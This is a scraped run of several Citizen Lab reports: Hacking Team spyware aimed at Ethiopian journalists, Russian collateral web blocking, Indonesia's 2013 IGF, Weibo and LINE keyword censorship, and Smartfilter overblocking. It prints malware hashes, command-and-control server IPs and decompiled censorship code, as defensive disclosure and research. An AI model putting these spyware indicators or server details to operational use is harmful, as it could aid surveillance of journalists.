instead of downloading a file from a server, the document contained an embedded file, which it copied as CyHidWin.exe. We extracted the file and analyzed it:\n\nsha256:   d30bc31d6ad75de20aa3a45d338298030dc9136ba94aee93b4843e279fa3d59c\r\nsha1:     4f8b2f1071870b9d03f3bb341cf9523b0574d8f6\r\nmd5:      c5cfa1afd5d3148a0d33fc1940ea1a37\n\nAs in the previous two files, the file communicated with 46.4.69.25. This file also matched our signature for RCS spyware. For the same reasons as the first two files, this file appears to be Hacking Team RCS spyware.\n \nEpilogue\nAfter the first two targeting attempts, we alerted ESAT that Yalfalkenu Meches was trying to target them with spyware. On the third attempt,the targeted user confronted Yalfalkenu, who again professed that he had received the file from a friend.\n\nYalfalkenu also expressed puzzlement about how opening a Word document could infect a computer, and said that he was a victim.\n\nWe talked to employees of ESAT, who said that Yalfalkenu used to collaborate with them, but then he “disappeared for a while.” It is possible that someone else is now using Yalfalkenu’s account.\n\nLinks to Other Spyware\nOur scans indicated that the following other servers were likely being run by the same attacker that targeted ESAT, and were also likely Hacking Team RCS servers:\n\n\n\n\n\n\n\n\n\n\nIP\nFirst Seen\nLast Seen\nProvider\nCountry\n\n\n109.200.22.160\n7/25/2012\n8/10/2012\nDelamere Services\nUK\n\n\n109.200.22.161\n7/25/2012\n8/12/2012\nDelamere Services\nUK\n\n\n109.200.22.162\n10/14/2012\n1/13/2014\nDelamere Services\nUK\n\n\n109.200.22.163\n10/13/2012\n1/13/2014\nDelamere Services\nUK\n\n\n176.74.178.45\n10/30/2013\n1/13/2014\nInfinite Dimension Solutions\nUK\n\n\n176.74.178.119\n7/25/2012\n8/12/2012\nInfinite Dimension Solutions\nUK\n\n\n176.74.178.120\n7/25/2012\n8/12/2012\nInfinite Dimension Solutions\nUK\n\n\n176.74.178.202\n10/13/2012\n1/13/2014\nInfinite Dimension Solutions\nUK\n\n\n176.74.178.203\n10/18/2012\n1/13/2014\nInfinite Dimension Solutions\nUK\n\n\n46.166.162.147\n5/16/2013\n8/11/2013\nSantrex\nSC\n\n\n69.60.98.203\n5/16/2013\nActive\nServerpronto\nUS\n\n\n216.118.232.245\n11/18/2013\nActive\nAriave Satcom\n??\n\n\n\nWe note that the “RCS Certification Authority” / “HT srl” SSL certificates returned by these servers were issued on 5/8/2012.  Based on this date, we estimate that the attacker who targeted ESAT has been using Hacking Team’s RCS spyware since May 2012, or earlier.\nWe found the following sample in VirusTotal that matched our signature for Hacking Team RCS spyware. The sample used 46.166.162.147 as a command-and-control server. Thus, we believe the attackers were the same, though we have no indication as to who they may have targeted:\n\nsha256:   9577aabf5e31af1409e2abe8c29ac918d7f8784dec75b4088a60fce6a45e9fc7\r\nsha1:     0e326c39c91efeff1d045bec3c7e7c38405d0430\r\nmd5:      c17e788e28d47891f94c64739ee7fffb\n\n \nConclusion\nIn this report, we identified three instances where Ethiopian journalist group ESAT was targeted with spyware in the space of two hours by a single attacker. In each case the spyware appeared to be RCS (Remote Control System), programmed and sold exclusively to governments by Milan-based Hacking Team. While Hacking Team and other “lawful intercept” spyware vendors purport to practice effective self-regulation, this case seems to be part of a broader pattern of government abuse of such spyware. “Lawful intercept” spyware has also apparently been abused to target Bahraini activists, Moroccan journalists, critics of the Turkish Government, and Emirati human rights activists.\n \nAcknowledgements\nThanks to Eva Galperin, the Electronic Frontier Foundation, and ESAT.\n \nFootnotes\n1“About ESAT,” Ethiopian Satellite Television, accessed February 13, 2014, http://ethsat.com.\n2 “About ESAT,” Ethiopian Satellite Television, accessed February 13, 2014, http://ethsat.com.\n3 “ESAT Accuses China of Complicity in Jamming Signals,” Ethiopian Satellite Television, June 15, 2011, accessed February 13, 2014, http://ethsat.com/2011/10/08/esat-accuses-china-of-complicity-in-jamming-signals.\n4 “UDJ Says Expressing Opinion to Media is Not ‘Terror’,” Ethiopian Satellite Television, January 9, 2013, accessed February 13, 2014, http://ethsat.com/2014/01/09/udj-says-expressing-opinion-to-media-is-not-terror.\n5 “Technology,” Ariave Satcom, accessed February 13, 2014, https://web.archive.org/web/20130723051052/http://ariave.com/tech.htm.\n6 “Customer Policy,” Hacking Team, accessed February 13, 2014, http://hackingteam.it/index.php/customer-policy.\n7 Declan McCullagh, “Meet the ‘Corporate Enemies of the Internet’ for 2013,” CNET, March 11, 2013, accessed February 13, 2014, http://news.cnet.com/8301-13578_3-57573707-38/meet-the-corporate-enemies-of-the-internet-for-2013/.\n8 Mónica Almeida, “Firma Hacking Team Fue Contactada Por Estado Ecuatoriano,” El Universo, December 11, 2013, accessed February 13, 2014, http://www.eluniverso.com/noticias/2013/12/11/nota/1901271/firma-hacking-team-fue-contactada-estado-ecuatoriano.\n9 David Gilbert, “Hacking Team and the Murky World of State-Sponsored Spying,” Interntional Business Times, March 13, 2013, accessed February 13, 2014, http://www.ibtimes.co.uk/hacking-team-murky-world-state-sponsored-spying-445507.\n10 “Customer Policy,” Hacking Team.\n11 “Ethiopia Arrests 2 Journalists From Independent Paper,” Committee to Protect Journalists, November 5, 2013, accessed February 13, 2014, http://www.cpj.org/2013/11/ethiopia-arrests-2-journalists-from-independent-pa.php.\n12 “Ethiopia,” Human Rights Watch, accessed February 13, 2014, http://www.hrw.org/world-report/2013/country-chapters/ethiopia.\n13 “They Want a Confession,” Human Rights Watch, October 17, 2013, accessed February 13, 2014, http://www.hrw.org/node/119814/section/2.\n14 “Ethiopia,” Human Rights Watch. http://www.hrw.org/world-report/2013/country-chapters/ethiopia?page=3.\n15 Ibid.\n16 “The Solution,” Hacking Team, accessed February 13, 2014, http://hackingteam.it/index.php/remote-control-system.\n17 Hacking Team, Remote Control System: Cyber Intelligence Made Easy, accessed February 13, 2014, http://wikileaks.org/spyfiles/docs/hackingteam/147_remote-control-system.html.\n18 “Spyware.

Some reports have indicated that the site may have been blocked due to images which had been posted in January 2014. This Citizen Lab blog post confirms that the website is blocked, however this is likely the result of collateral filtering and not a deliberate attempt to target the bobsledder’s site.\nTests conducted for accessibility of the site: http://justinkripps.ca on publicly available HTTP proxies across Russia confirm that this URL is blocked. We have seen blockpages returned for this website on two Autonomous System (AS): OJSC Rostelecom (AS3239) and a private company AS whose sole peer is OJSC Rostelecom (AS12389), which are based in Moscow and Buryatia, Russia, respectively. Rostelecom is the official provider of the telecommunications infrastructure for the Olympic games in Sochi.\nAttempts to access this URL on these two proxies returned the same blockpage:\n\nAn automated English translation of this page confirms this is a deliberate block:\n \nDear users, We apologize, but access to the requested resource is limited.\nPossible reasons for limiting access:\nAccess is limited by court order or otherwise established by the legislation of the Russian Federation.\nNetwork address, which identifies the site on the “Internet”, included in the Unified Registry of domain names, indexes pages sites network “Internet” and the network address for the identification of sites in the “Internet”, containing information dissemination in the Russian Federation is prohibited. Check availability of the network address in the Unified Register in the section “Viewing the Registry” online www.zapret-info.gov.ru .\nNetwork address, which identifies the site on the “Internet”, included in the registry of domain names, indexes pages of sites in the “Internet” and the network address for the identification of sites in the “Internet”, containing information disseminated in violation of the exclusive rights. Check network address in the Registry, you can see “Viewing the Registry” online nap.rkn.gov.ru .\n \nThe blockpage is consistent with reports of blocked content on this ISP. ISPs in Russia are required to block content which is deemed to be harmful to children.\nThe website justinkripps.ca is hosted on the IP address 66.96.160.149 by U.S. based hosting provider Endurance International Group. In addition to this site, thousands of additional domains are also hosted at this same IP address. Tests on the same Russia-based proxies show that all of these URLs are also blocked with this same blockpage. For example, the site catchthetrout.ca which is a “Rural Public Transit Service in Ontario” was also found to be blocked on the same proxies with the same message, although it is unlikely that such a local website would be targeted by Russian authorities.\n\nThe status of a given URL/IP address can be determined by searching Russia’s official blacklist. Looking up this IP address in the blacklist indicates that it was added to the blacklist on November 26, 2013:\n \n\n \nThe ‘blacklisting decision maker’ is listed as ‘ФСКН’ (‘FDCS’) or the Federal Drug Control Service of Russia. The website of Justin Kripps (justinkripps.ca) is not listed on this blacklist. We were not able to identify a domain also hosted on this IP which is listed on this blacklist.\nThis evidence indicates that the Olympian’s site is likely not the intended target of blocking. Instead, this appears to be an example of collateral filtering, where crudely implemented attempts to block a website inadvertently lead to the blocking of other sites hosted at the same IP address. Russian authorities have been quoted as warning website owners which share IP addresses to “check who your neighbours are.”\nThe HTML source of the blockpages and content returned from the University of Toronto network is available here.\n \n \nUpdate: Feb 11th, 2014\n\nCitizen Lab researchers confirmed today that the website justinkripps.ca is now accessible from Russia on the ISPs Rostelecom, Dom, TTK, and MTC. We tested the accessibility to the website after learning that the website has changed its IP address.\nThis blocking was a problem that was solved largely due to the public attention paid to this particular case. There are still thousands of domain names that are residing on the previous IP address they are likely still being blocked in Russia.\nThis case highlights some key challenges that collateral filtering presents. For one, this type of blocking unfairly targets content that is completely unrelated to the intended block page. Further, moving content from one IP address to another might involve unexpected costs and inconveniences that may prohibit smaller organizations from moving their content.\nThere is also a lack of awareness that the content is being blocked in a country, and when discovered can easily be misinterpreted, as this story highlights. Finally it creates a patchwork on the Internet addressing space that will be guarantee any future content posted on a blocked IP address will be end up being blocked to a segment of a population without any recourse.\n\n\t\t\t\t\n\t\t\t",

Seperti banyak negara di Selatan Dunia, Indonesia telah dengan cepat masuk ke dalam alam komunikasi digital global. Ibukota negara, Jakarta, disebut sebagai kota Twitter paling aktif di dunia, dan Indonesia kini memiliki jumlah keempat terbesar pengguna Facebook. Dari jumlah yang praktis nol hanya satu dekade lalu, Indonesia sekarang memiliki sekitar 800.000 pengguna baru Internet setiap bulan. Seperti yang umumnya terjadi di negara-negara yang baru terhubung, sarana utama berkomunikasi online di Indonesia adalah ponsel — banyak orang Indonesia membawa dua telepon genggam — menjadikan para warga negara Indonesia terhubung dan terlibat aktif.\nTapi seperti banyak negara lain di Selatan Dunia, Indonesia memiliki banyak tantangan pemerintahan. Sebagai negara mayoritas Muslim terbesar di dunia, kekhawatiran tentang masalah agama dan sosial selalu meresap ke tingkat perumusan kebijakan, dan merayap ke dalam diskusi tata kelola Internet. Negara kepulauan ini juga menjadi tegang akibat adanya ancaman perpecahan regional dan pertentangan dengan pemerintah pusat yang masih sesekali terlihat. Bom di Bali pada tahun 2002 dan 2005 masih ada di pikiran banyak orang dan mewarnai lanskap keamanan Indonesia. Meskipun rezim otoritarian telah berlalu, institusi demokrasi Indonesia terhitung masih baru lahir dan masih ada banyak masalah yang harus diselesaikan, termasuk pertanggung jawaban dari militer atas pelanggaran hak asasi manusia .\nLaporan ini adalah yang pertama dari serangkaian laporan dari Citizen Lab yang menerapkan metode campuran, dari interogasi teknis saat penelitian lapangan berlangsung dan analisis sosial dan hukum, untuk mempelajari kontrol informasi pada saat dan sebelum atau sesudah peristiwa tertentu. Pendekatan kami dalam melakukan pemantauan berdasarkan aktivitas kontrol informasi merupakan evolusi riset Citizen Lab dalam melakukan penelitian dunia maya dan politik global. Selama periode keterlibatan kami di OpenNet Initiative,1 pendekatan yang kami gunakan dalam proyek itu adalah melakukan studi banding dari satu negara ke negara lain, tanpa pertimbangan khusus akan kapan penelitian tersebut dilakukan, terlepas dari ada atau tidaknya tim peneliti di negara tersebut saat penelitian ingin dijalankan . Sementara itu, kami melihat bahwa dinamika kontrol informasi yang paling menarik terjadi “just-in time” (pada saat waktu informasi tersebut sangat diperlukan) dan sekitar peristiwa politik, seperti pemilihan umum, hari peringatan, konferensi global, dan acara olahraga seperti Olimpiade dan World Cup. Sebabnya adalah pada saat peristiwa politik berlangsung maka informasi memiliki nilai dan kekuatan yang besar, dan yang paling sangat diperebutkan. Selain itu, peristiwa besar mungkin menciptakan standar atau peraturan baru, yang dapat menjadi standar atau peraturan yang dianggap normal setelah peristiwa tersebut selesai. Karena alasan ini, maka Citizen Lab telah memulai sebuah proyek baru yang mengadakan pemantauan berdasarkan aktivitas kontrol informasi, dan laporan ini adalah yang pertama.\nCitizen Lab memilih untuk meneliti kontrol informasi saat dan sebelum Indonesia menjadi tuan rumah konferensi Forum Tata Kelola Internet (Internet Governance Forum (IGF)), yang berlangsung dari tanggal 20 Oktober sampai dengan tanggal 25 Oktober 2013. Para peneliti Citizen Lab, staf, dan rekan-rekan kami telah memiliki banyak pengalaman menghadiri IGF dan World Summit on the Information Society (WSIS) yang mengesankan, termasuk acara peluncuran buku dan presentasi lainnya yang di ganggu oleh pemerintah tuan rumah dan keamanan resmi IGF. Namun, partisipasi kami dalam IGF 2013 di Indonesia berlangsung tanpa gangguan. Tidak seperti acara-acara IGF sebelumnya, kami juga datang tidak hanya untuk hadir dan memberikan presentasi, tetapi juga untuk melakukan penelitian terapan selama acara tersebut berlangsung. Kami bekerja sama dengan mitra civil society Indonesia selama berbulan-bulan menjelang IGF, yang memberikan kami pandangan yang unik ke dalam proses politik seputar perencanaan dan persiapan. Dengan bantuan dari para rekan-rekan kami di Indonesia, beberapa di antaranya ingin tetap anonim, kami melakukan pengukuran jaringan di dalam negeri dan secara jarak jauh (remote network measurement) yang bertujuan untuk mendokumentasikan penapisan dan praktek pengawasan konten Internet, dan mewawancarai para pejabat yang menghadiri IGF. Collin Anderson, seorang peneliti independen, memberikan kontribusi data dari penyelidikan  oleh OONI2 yang dia lakukan selama IGF. Bagian dari laporan ini ditulis di tempat, dimana sebagian dari anggota tim kami bekerja dari tempat konferensi IGF atau dari hotel konferensi, sementara staf dan peneliti di kantor Citizen Lab di Toronto melakukan analisis teknis dan penelitian kontekstual. Penemuan awal kami dipresentasikan pada konferensi pers dan sesi panel di IGF. Bagian akhir dari laporan ini ditulis setelah IGF berlangsung, dan memberikan serangkaian refleksi pada proses keseluruhan.\nLaporan ini diteliti dan ditulis secara kolaboratif , oleh Citizen Lab (dalam urutan abjad) Matt Carrieri, Masashi Crete-Nishihata, Jakub Dalek, Ron Deibert, Bennett Haselton, Saad Khan, Marianne Lau, Helmi Noman, Irene Poetranto, Adam Senft, dan Greg Wiseman. Hasil penelitian Citizen Lab sebelumnya yang dilakukan oleh Morgan Marquis-Boire, Bill Marczak, dan John Scott-Railton juga menginformasikan laporan tersebut. Irene Poetranto menerjemahkan laporan ini ke dalam Bahasa Indonesia. Ucapan terima kasih secara khusus kami berikan kepada Collin Anderson, Harijanto Pribadi (Kepala Departemen Indonesia Internet Exchange, Asosiasi Penyedia Jasa Internet Indonesia), Profesor Sinta Dewi Rosadi (Fakultas Hukum, Universitas Padjadjaran, Bandung, Indonesia), dan beberapa mitra civil society Indonesia yang berkontribusi terhadap melaporkan tapi ingin tetap anonim .\n\n\t\t\t\t\n\t\t\t",

The nation’s capital, Jakarta, is said to be the most active Twitter city in the world and Indonesia now has the fourth largest number of Facebook users. From a baseline of practically zero only a decade ago, Indonesians are connecting at a rate of roughly 800,000 users every month. As is so often the case today among newly connected countries, the primary means of communicating online in Indonesia are mobile devices — many Indonesians carry two of them — making the country’s citizens highly wired and fully engaged.\nBut like many other countries in the global South, Indonesia has more than its share of governance challenges. As the world’s largest majority Muslim country, concerns about religious and social issues are always percolating at the policy level, and are creeping into Internet governance discussions. The archipelago is also strained by regional schisms and barely contained insurgencies that still occasionally burst out into the open. Bombings in Bali in 2002 and 2005 are still imprinted on many minds and colour the Indonesian security landscape. Although Indonesia’s three decade period of dictatorship has now passed, the country’s democratic institutions are still nascent and there are many issues to resolve, including holding the powerful armed forces accountable for past atrocities.\nThis report, Islands of Control, Islands of Resistance: Monitoring the 2013 Indonesian IGF, is the first in a series of Citizen Lab reports that apply a mixture of methods, from technical interrogation to field research and social and legal analyses, to study information controls in and around particular events. Our interest in event-based monitoring of information controls is an evolution in the Citizen Lab’s approach to research of cyberspace and global politics. During the period of our involvement in the OpenNet Initiative,1 the approach of that project was to undertake country-by-country comparative studies with little consideration given to timing apart from the availability of researchers inside the country. Meanwhile, we noticed, the most interesting dynamics around information controls were happening “in time” and around political events, like elections, anniversaries, global conferences, and sporting events. It is during political events that information has its greatest value and power, and is most highly contested. Moreover, events are episodes that mark turning points, perhaps creating a plateau of standards and regulations to follow, a kind of punctuated equilibrium of practices that become normalized after the event is done. For those reasons, Citizen Lab has embarked on a new project examining event-based monitoring of information controls, of which this report is the first.\nThe Citizen Lab chose to focus on information controls in and around Indonesia’s hosting of the United Nations Internet Governance Forum (IGF), running from October 20th (“Day 0”) to October 25, 2013. While Citizen Lab researchers, staff, and associates have had many memorable IGF and World Summit on the Information Society (WSIS) experiences, including having book launches and other presentations disrupted by host government and IGF official security, our participation in the Indonesian IGF went without interference. Unlike prior IGFs, we also came properly equipped not just to attend and present, but also to undertake applied research during the course of the event. We worked closely with Indonesian civil society partners for many months leading up to the IGF, which gave us unique insight into the political processes surrounding the planning and preparation. With the help of the same Indonesian partners, some of whom wish to remain nameless, we undertook in-country and remote network measurements aiming to document Internet content filtering and surveillance practices, and interviewed officials attending the IGF. Independent researcher Collin Anderson contributed data from OONI probe tests2 he undertook during the IGF. Parts of this report were written in situ, some of us working from the IGF conference venue or from the conference hotel while other Citizen Lab staff and researchers in Toronto undertook technical analysis and contextual research. Our preliminary findings were presented at a press conference and a panel session at the IGF. The final section of the report was written after the IGF had wrapped up, and provides a series of reflections on the overall process. \nIslands of Control, Islands of Resistance was researched and written in a collaborative fashion, by the Citizen Lab’s (in alphabetical order) Matt Carrieri, Masashi Crete-Nishihata, Jakub Dalek, Ron Deibert, Bennett Haselton, Saad Khan, Marianne Lau, Helmi Noman, Irene Poetranto, Adam Senft, and Greg Wiseman. Prior research of the Citizen Lab’s Morgan Marquis-Boire, Bill Marczak, and John Scott-Railton also informed the report. The Citizen Lab’s Irene Poetranto translated this report into Bahasa Indonesia.

    "text": "\n\t\t\t\tDownload PDF version I Read on ISSUU \nSina Weibo is China’s most important social media website, with hundreds of millions of users sharing posts about everything ranging from their favorite pop stars to what they just ate. However, it can also be used to circulate political news and commentary critical of the government, a feature authorities try to restrict in a number of ways, including by blocking the words that people can search for.\nThe inability to search for certain words can be static. For instance, Radio Free Asia (自由亚洲电台) and Falun Gong (法轮功) have been blocked consistently on the site since 2011. However, sometimes words can get unblocked and/or re-blocked, which is a potential indication of shifting political winds or simply housecleaning on the part of the censors who may remove previously-filtered keywords from the list once they are deemed no longer sensitive.\nAmong the most scrutinized keywords is Bo Xilai , the name of the former head of Chongqing, a major city in China. Once earmarked for the highest echelons of leadership in the country, Bo was embroiled in various scandals and is now serving a life sentence.\nIn the infographic linked to below, we have collected data from a number of sources, including GreatFire.org, China Digital Times, Blocked on Weibo, and Twitter users to chart the moments when Bo’s name became blocked or unblocked on Weibo. The speculation is that the authorities blocked his name when online conversations got too unpredictable to control and unblocked it when they sought to give netizens the space to criticize Bo.\nWe have lined up those moments with what was taking place offline at the same time, presenting a connection between how real-life political turmoil was often reflected in changes in censorship online.

    "text": "\n\t\t\t\tOn November 14, The Citizen Lab published a report by Senior Security Researcher Seth Hardy revealing regionally-based keyword censorship for users in China in the popular chat application LINE developed by Japanese company, LINE Corporation.\nThe code analysis in our report was performed on LINE v3.8.5 for Android and the behavior was confirmed on an Android device running v3.9.3 downloaded directly from the Google Play store. We confirmed the  presence of censorship functionality going back to v3.4.2, released on January 18 2013.\nLINE launched a Chinese-branded version of the app, Lianwo (连我), in December 2012 in partnership with Chinese software company Qihoo 360 Technology Co., Ltd. We found keyword censorship functionality in both LINE and Lianwo. However, it is unclear whether the Lianwo version of LINE has additional functionality or is merely rebranded version for the Chinese market.\nLINE recently announced it reached 300 million registered users just four months after announcing a registered user base of 200 million. In the background of this milestone, questions remain regarding how keyword censorship for users in China is managed by LINE and the greater implications of these policies.\nA number of media outlets covered our findings including The Next Web, Time Magazine, South China Morning Post, and The Japan Times. In response to media questions on LINE’s censorship functionality, LINE Corporation representatives continually emphasized differences between Lianwo and LINE.\nQuoted in The Next Web, a LINE spokesperson drew a “clear line between Lianwo and LINE, emphasizing that the Chinese version of LINE is different from the global version.” Similarly in response to questions from The Japan Times, Hazuki Yamada, the global PR manager for LINE Corporation, stated that Lianwo is “different from global versions of LINE,” noting that non-Lianwo users are unaffected by the keyword censorship. Yamada acknowledged that LINE Corporation “provides services in accordance with the local environment and government regulations of mainland China,” and “there are occasions when keywords found in violation of Chinese laws are not transmitted.” She declined to offer details on how the banned words are selected, but confirmed that the keyword censorship is done on the client-side rather than server side, which accurately reflects our findings.\nWe sent Hazuki Yamada a set of our own questions on November 26 (see them in full below):\n\nOf the countries that LINE Corporation operates in, has LINE Corporation agreed to abide by local laws that have influenced how the LINE application functions? For example, is LINE Corporation mandated by the Chinese government or any other government to censor keywords or other content in the LINE application?\n\n\nIn this article published in The Next Web, a representative from LINE corporation is described as drawing “a clear line between Lianwo and Line, emphasizing that the Chinese version of LINE is different from the global version.” All of the analysis that we report on was conducted on LINE v3.8.5 for Android (APK MD5: 56c9076d56cc20f618df83eaf97a52dc), and the behaviour was confirmed on an Android device running v3.9.3 downloaded directly from the Google Play store. We found regionally-based censorship functionality in this version of LINE and therefore our findings show that LINE and Lianwo both have keyword censorship functionality. Please clarify if the Lianwo version of LINE has additional functionality or is just a rebranded version for the Chinese market.\n\n\nPlease clarify the relationship between LINE Corporation and Qihoo 360. How does this relationship work in practice for the Chinese market? Is Qihoo 360 involved in any technical development of LINE Corporation’s products?\n\n\nHow are the keyword lists in LINE that are used to trigger keyword filtering for users based in China developed? Who makes the decisions over what specific keywords are included on these lists? Does LINE or Qihoo 360 receive directives from the Chinese government or other third parties regarding what topics or specific keywords should be blocked?\n\n\nHas LINE Corporation received government requests for user data? If so, please detail what country the request came from, the nature of the request, and LINE Corporation’s response to the request.\n\n\nWould LINE Corporation consider publishing a transparency report that details the number of government requests the company receives for user data from the LINE application, which country these requests come from and what the response of LINE Corporation was to the requests? Other major technology companies have issued transparency reports including: Google, Microsoft, Yahoo!, Twitter , Apple, and Linkedin.\n\nOn November 27, Yamada provided the following reply:\n“LINE had to conform to local regulations during its expansion into mainland China, and as a result the Chinese version of LINE, ‘LIANWO,’ was developed. The details of the system are kept private, and there are no plans to release them to the public”.\nThis response demonstrates a lack of transparency around LINE’s practices in China. Despite not directly responding to our questions, we observe LINE Corporation making changes to how keyword censorship and traffic encryption operate in the latest versions of the application.\nChanges to Regionally-based Keyword Censorship\nThe last update to LINE v3.9.4 in the Google Play store was on November 27.  The change log for this version is as follows:\n\n\nFixed the bug preventing messages from being displayed when received.\n\n\nImproved picture quality of Snap Movie clips\n\n\nOther minor bug fixes\n\n\nA deeper analysis of LINE v.3.9.4 shows changes to regionally-based keyword censorship functionality. Users who register with a Chinese phone number will continue to have outbound and inbound messages censored if they contain sensitive keywords. In our original analysis we found LINE has an internal keyword list on the APK. If the user’s registered phone number is set a to Chinese number the application will download an additional keyword list from Naver’s server and block transmission of any messages that contain any of those keywords. The downloaded keyword file is stored in the application’s cache directory as cbw.dat. If this list is unavailable, LINE will default to using the internal list of 50 keywords. This internal list has been present in LINE and unchanged since it was added in v3.4.2. In v3.9.4 the internal list has been removed and the application will check for a cache file that the words would have been in and deletes it.\nCompare this code snippet from LINE v3.9.3:\nprivate static Pattern g()\n{\nFile localFile = new File(n.b().getApplicationContext().getCacheDir(), “cbw.dat”);\nif (!localFile.exists())\ntry\n{\nPattern localPattern2 = getInternalBadWords();\nreturn localPattern2;\n}\ncatch (bwd localbwd2)\n{\na(“failed getDefaultWords”, localbwd2);\nreturn null;\n}\nWith this snippet from LINE v3.9.4:\npublic static void a()\n{\nFile localFile = new File(q.b().getApplicationContext().getCacheDir(), “cbw.dat”);\nif (localFile.exists())\nlocalFile.delete();\n}\nIt is unclear what the purpose of removing the internal list is. The same 50 keywords in the internal list were present in the May 2013 finding of 150 banned keywords in Lianwo revealed by a Taiwanese developer who goes by the twitter handle @hirakujira. This keyword list also appears to be an internal file. This analysis was run on Lianwo version 3.6.5 for iOS and the same list was confirmed to be present on Android.\nCompare this Base64 encoded and encrypted internal keyword list found by @hirakujira:\n\nTo the Base64 encoded and encrypted list we found, which is noticeably smaller since it contains only 50 keywords:\n5mxphvUu6sGOrG+Qw8EsqlMmx+kNh11mTfMLXZgNmxLfH4grWErsAEsqw+j34zUbdxDUiitSMr77CBwBdEojcKjIHvdBPtRFduMb5TgvBjbtzmlXHN+UmUsDVmto7rMdCwP6+/AEzLmKB6GsAEs+3Q8xEtejCqdMnuU262feg4m5OrNxlgX3wpifO/+9Q9lm4KzHAhs7ZSGCOZbE2j6wPOTTMA6TXh9G1gA560ZjGNu+tLPJStUd08Kkw+AQvLl3ZSC3CexDT83D+FK1MYAUmfc6BIGh/AalsSszJcLyatT7hRUpeNl0/3i+0z2vtEZxEO6SU4mempEnR9ErjGWLpUIbNdWxFVf32Le1UaLE000+fL0y06lopoFyGIjELHg+dbtmGFRMpxhmZauEFmkIeElCVctonsX1866+c3qXVfDnXZg30BXb9Octrytti5C81/P9M0yDrbtDod2IKX1k39IDrsdqTPUC3+TYyuAOACGnAN/FNkRQmeBbhzpY7Du2+F2fLm8QlFhm2MczaHyj9aDjMfUAEukNDtYi+Jj3MS+h8/F9FW3gMHjneviLWBBe0fRJBbrxRvUKDtvS6vrMO/J2+nxiz/3dBgkG2kXFR6Y9PfV7X0fmBW/ZZLM3MMUk8LMmAJIuhcaiKhaHg4721pXqT7v7U2FmHLLiKJIev4a0lG+bxg9nM2m9IcDRSq7Uca08JefErOSSUOWUoeWhNTtr1dhu07HgbhBaHxdHvurl9Ld+FHiKrJZNbZEnuNK5+xOrmBVemDc8untuB5IhotpDU3yAnZNmvZSDJ00/PH05jOCbf4SgW+rkVOjsgodSpljGar7OBSfGR+hMujN4gay3hHm9Ygg5zN8LlME31CcADlFRCixo0p3b3VxMlAvBHSRItE/B/QwxKsG/IY7y2LCu6wJrctgfPYW/px2ItSOnd4LtztEpCBhQT3/CZbO6c0OLWaDPufjnZYuyEXyA6677+aMcIAA0RpInRMmzwYg7eG4PnuygTgDWhm6mc5C8Raz2teUysHhsIP26WAjdBQ+IPWgRvKLDzgpKaOI+moYqXarkTRBBdtMEOp4d4+sU953rE4i8sWtVHSzpV9sprJ5FgdayGOleKnZoy9GX1l38ey983hX8+LnMsyVKpjw8I9NWCFdknigP9QvAAYaDAqE0g4Y0oD3G1YAikkHCV0Foc8lUww++9XpECxlED7znaF9USMeXV+ZyzRjztUk/kg==\nThe content of the list relates to domestic Chinese politics, human rights, and sensitive political events–many of which are rather obscure and only mentioned in media known for being critical of the Communist Party of China (see first 50 entries in this translated keyword list). A number of these keywords relate to lightly reported incidents that did not go viral, which raises questions as to why they were included. The fact that some of these censored incidents are not high profile seems to indicate that they have been added by LINE as a pre-emptive, preventative measure or could potentially have been intended for testing and not production use. Thus, the internal list may have been removed because these keywords no longer merit inclusion.\nLianwo has not been updated since release of our report and still contains the 50 keyword internal file. Lianwo reports the same versions and capabilities as LINE v3.9.3 but the files (code and non-code) do not have matching MD5s. Therefore, there are differences between LINE v3.9.3 and Lianwo but the nature and extent of these differences are unknown.\nWhile there are subtle differences between the latest versions of LINE and Lianwo, both clients continue to actively censor keywords for users registered to Chinese phone numbers, which further calls into questions the responses made by LINE Corporation.\nOur LINE Region Code Encrypter Tool is still able to change regions in the LINE / Lianwo client to disable regionally-based keyword censorship in the application (interface now available in Chinese 中文).\nChanges to Traffic Encryption\nSince conducting our original analysis we also observe changes to how LINE encrypts traffic. Our analysis of the LINE communication protocol was conducted in September 2013 on v3.8.5. These tests found that communications were not encrypted over 3G connections, but were encrypted over WiFi. We have tested each subsequent release since v3.8.5 and found that v3.9.2 was still unencrypted over 3G with traffic visible to 119.235.235.91 on port 5000. However, since v3.9.3 released on October 2, 2013, it appears that traffic is encrypted over HTTPs going only to 119.235.235.91 (a LINE server that application activity is routed to). The latest version of Lianwo is also encrypted over 3G.\nIn the changelog for LINE v3.9.3 there is no mention of encryption of traffic over 3G connections.\n\n\nAdded a setting that prevents users not on your friends list from sending you messages.\n\n\nAdded the “Snap Movie” function which allows you to add BGM to short videos and send them to your friends\n\n\nIncreased the length of voice messages to 30 minutes.\n\n\nOther minor bug fixes\n\n\nThe change to HTTPs over 3G is a welcome improvement to the application, but it is curious why LINE Corporation did not openly publicize this change nor explain why it was not implemented earlier.\nConclusion\nAs LINE continues to spread globally, pressures to conform to local regulations and government requests for user data are likely to increase. Other leading technology companies have tried to address these pressures and provide information to their users through transparency reports and dialogue in bodies such as the Global Network Initiative. We encourage LINE Corporation to avoid opaque statements on its business practices, better inform users of changes to security and privacy features, develop better and more transparent reporting of any government requests to censor or monitor communications on their products, and to join these progressive industry dialogues.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tDownload PDF I Read on ISSUU\nBy Bennett Haselton\nWhat do the Trinity Davison Lutheran Church, the Filipino American Women’s Network, the Tuscon Jazz Institute, the Sacramento Police Activities League, the Pan Iranist Party of Iran, and the Salvation Army of Houston, Texas have in common?\nTheir websites are all blocked for Internet users in Saudi Arabia, and for most users in the United Arab Emirates. This is not because the governments of these countries disapprove of these websites. Rather, these sites are blocked by ISPs because of their use of the U.S.-made Internet blocking program “Smartfilter”, a program that often mistakenly categorizes these sites and many others as “pornography.”\nThe Smartfilter web blocking product has existed since 1996. In 2008, McAfee acquired Secure Computing, the company that manufactured Smartfilter. McAfee runs a support site at http://www.trustedsource.org/ that allows users to look up how sites are classified in Smartfilter’s rating system. For example, the screen captures here, here and here show http://www.trinitydavison.org/, http://www.paniranist.org/, and http://www.sahouston.org/ categorized as “pornography.” The lookup form does not give any reason why the sites would have been categorized as such, and none of these or other sites in our report contained any content that could be viewed as pornographic. The lookup form does, however, provide the option to email feedback to McAfee asking for a site’s classification to be changed. We did not submit any requests to change the classifications of any of the sites we found to be blocked.\n\nFigure 1 – An example of a site miscategorized as pornography by Smartfilter\nA previous OpenNet Initiative report, “West Censoring East”, focused on the issue of American and Canadian software companies selling Internet filtering programs to government censors in the Middle East and North Africa. Countries like Saudi Arabia, UAE, Kuwait, Bahrain, Oman, Tunisia, and Iran have used Smartfilter at various times for nationwide Internet censorship. Currently, 